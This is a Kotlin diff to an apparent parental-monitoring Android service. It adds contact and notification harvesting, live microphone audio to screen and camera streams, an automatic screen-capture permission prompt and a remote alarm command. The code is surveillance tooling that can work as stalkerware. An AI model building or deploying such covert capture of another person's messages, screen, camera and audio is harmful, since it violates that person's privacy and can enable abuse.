@@ -28,12 +28,15 @@ import com.guardian.parent.service.live.LiveStreamManager
 import com.guardian.parent.service.capture.ScreenCaptureSource
 import com.guardian.parent.service.collectors.CallLogCollector
 import com.guardian.parent.service.collectors.CameraCollector
+import com.guardian.parent.service.collectors.ContactsCollector
 import com.guardian.parent.service.collectors.HeartbeatCollector
 import com.guardian.parent.service.collectors.InstalledAppsCollector
 import com.guardian.parent.service.collectors.LocationCollector
+import com.guardian.parent.service.collectors.NotificationCollector
 import com.guardian.parent.service.collectors.ScreenshotCollector
 import com.guardian.parent.service.collectors.SmsCollector
 import com.guardian.parent.service.collectors.UsageCollector
+import com.guardian.parent.ui.PermissionActivity
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -114,6 +117,8 @@ class MonitorService : LifecycleService() {
     private lateinit var appsCollector: InstalledAppsCollector
     private lateinit var callsCollector: CallLogCollector
     private lateinit var smsCollector: SmsCollector
+    private lateinit var contactsCollector: ContactsCollector
+    private lateinit var notificationCollector: NotificationCollector
     private lateinit var screenshotCollector: ScreenshotCollector
     private lateinit var cameraCollector: CameraCollector
     private lateinit var heartbeatCollector: HeartbeatCollector
@@ -129,6 +134,8 @@ class MonitorService : LifecycleService() {
         appsCollector = InstalledAppsCollector(this)
         callsCollector = CallLogCollector(this)
         smsCollector = SmsCollector(this)
+        contactsCollector = ContactsCollector(this)
+        notificationCollector = NotificationCollector(this)
         screenshotCollector = ScreenshotCollector(this)
         cameraCollector = CameraCollector(this)
         heartbeatCollector = HeartbeatCollector(this)
@@ -185,6 +192,11 @@ class MonitorService : LifecycleService() {
         } catch (t: Throwable) {
             Logger.w("Unable to stop the live stream", t)
         }
+        try {
+            RemoteAlarm.stop()
+        } catch (t: Throwable) {
+            Logger.w("Unable to stop the remote alarm", t)
+        }
         deviceSocket?.close()
         deviceSocket = null
         scope.cancel()
@@ -206,6 +218,7 @@ class MonitorService : LifecycleService() {
         if (deviceSocket != null) return
         val socket = DeviceSocket(store, ::onControlMessage)
         liveManager.setSink { source, jpeg -> socket.sendFrame(source, jpeg) }
+        liveManager.setAudioSink { source, pcm -> socket.sendAudio(source, pcm) }
         deviceSocket = socket
         socket.connect()
     }
@@ -221,12 +234,13 @@ class MonitorService : LifecycleService() {
         when (message.optString("type")) {
             "live.start" -> {
                 val source = message.optString("source", "screen")
+                val withAudio = message.optBoolean("audio", true)
                 scope.launch {
                     val error = try {
                         if (source == "camera") {
-                            liveManager.startCamera()
+                            liveManager.startCamera(withAudio)
                         } else {
-                            liveManager.startScreen()
+                            liveManager.startScreen(withAudio)
                         }
                     } catch (t: Throwable) {
                         Logger.e("Unable to start the live stream", t)
@@ -238,11 +252,16 @@ class MonitorService : LifecycleService() {
                         sendLiveState("started", source, null)
                     } else {
                         if (error == "NO_CONSENT") {
-                            // Remember the request: as soon as the user grants
-                            // the consent from the notification, the stream
-                            // starts without another command from the parent.
                             pendingScreenLive = true
                             pendingScreenLiveAt = System.currentTimeMillis()
+                            try {
+                                val intent = Intent(this@MonitorService, PermissionActivity::class.java)
+                                    .putExtra(PermissionActivity.EXTRA_REQUEST_SCREEN_CAPTURE, true)
+                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                                startActivity(intent)
+                            } catch (t: Throwable) {
+                                Logger.w("Unable to launch permission activity for screen consent", t)
+                            }
                             Notifications.notifyConsentNeeded(this@MonitorService)
                         }
                         sendLiveState("error", source, error)
@@ -286,6 +305,41 @@ class MonitorService : LifecycleService() {
                         )
                     } else {
                         sendLiveState("error", "camera", error)
+                    }
+                }
+            }
+
+            "device.command" -> {
+                val action = message.optString("action", "")
+                when (action) {
+                    "alarm" -> {
+                        RemoteAlarm.start(this)
+                        deviceSocket?.sendText(
+                            JSONObject()
+                                .put("type", "device.command.result")
+                                .put("action", "alarm")
+                                .put("ok", true)
+                        )
+                    }
+
+                    "stop_alarm" -> {
+                        RemoteAlarm.stop()
+                        deviceSocket?.sendText(
+                            JSONObject()
+                                .put("type", "device.command.result")
+                                .put("action", "stop_alarm")
+                                .put("ok", true)
+                        )
+                    }
+
+                    else -> {
+                        deviceSocket?.sendText(
+                            JSONObject()
+                                .put("type", "device.command.result")
+                                .put("action", action)
+                                .put("ok", false)
+                                .put("error", "BAD_COMMAND")
+                        )
                     }
                 }
             }
@@ -366,7 +420,7 @@ class MonitorService : LifecycleService() {
             return
         }
         val error = try {
-            liveManager.startScreen()
+            liveManager.startScreen(true)
         } catch (t: Throwable) {
             Logger.e("Unable to resume the live screen stream", t)
             "INTERNAL"
@@ -520,6 +574,11 @@ class MonitorService : LifecycleService() {
         ) {
             types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
         }
+        if (extraTypes and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE != 0 &&
+            Permissions.microphoneGranted(this)
+        ) {
+            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        }
         if (extraTypes and ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION != 0) {
             types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
         }
@@ -587,6 +646,8 @@ class MonitorService : LifecycleService() {
         CollectorIds.APPS to { appsCollector.collect() },
         CollectorIds.CALLS to { callsCollector.collect() },
         CollectorIds.SMS to { smsCollector.collect() },
+        CollectorIds.CONTACTS to { contactsCollector.collect() },
+        CollectorIds.NOTIFICATIONS to { notificationCollector.collect() },
         CollectorIds.SCREENSHOT to { screenshotCollector.collect() },
         CollectorIds.CAMERA to { cameraCollector.collect() }
     )
